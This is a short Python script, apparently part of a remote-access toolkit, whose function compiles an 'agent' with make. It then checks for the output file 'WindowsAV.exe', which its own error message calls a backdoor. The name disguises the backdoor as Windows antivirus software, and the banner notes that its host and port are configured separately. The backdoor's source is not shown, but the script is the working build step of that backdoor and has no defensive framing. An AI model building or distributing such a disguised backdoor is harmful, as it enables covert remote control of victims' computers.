"""

Generate Agent

"""
import os

def create_agent():
    
	print(
		"""
	----------------------------------------------------------------------------
    -> Generate Agent!															
    -> This only compiles the agent for you, NOT changes host and port.		
    -> Follow the instructions on the Official page to change Host and Port.   
	----------------------------------------------------------------------------
	"""
	)

	if(os.name == "nt"):
	    os.chdir("agent")
	    print("Operating System Windows detected. Executing Make! Make sure it is installed correctly")
	    os.system("make")
	else:
		os.chdir("agent")
		print("Operating System must be Linux (detected). Executing Make!")
		os.system("make linux")
	os.chdir("..")
	try:
		file = "agent/WindowsAV.exe"
		with open(file, "rb") as backdoor:
			hello = os.stat(file)
			print("\n-> WindowsAV.exe | Size : {size} bytes | Path : {path}"
				.format(size=str(hello.st_size), path=os.path.dirname(os.path.abspath(file))))
	except FileNotFoundError:
		print("-> Failed to create Backdoor.")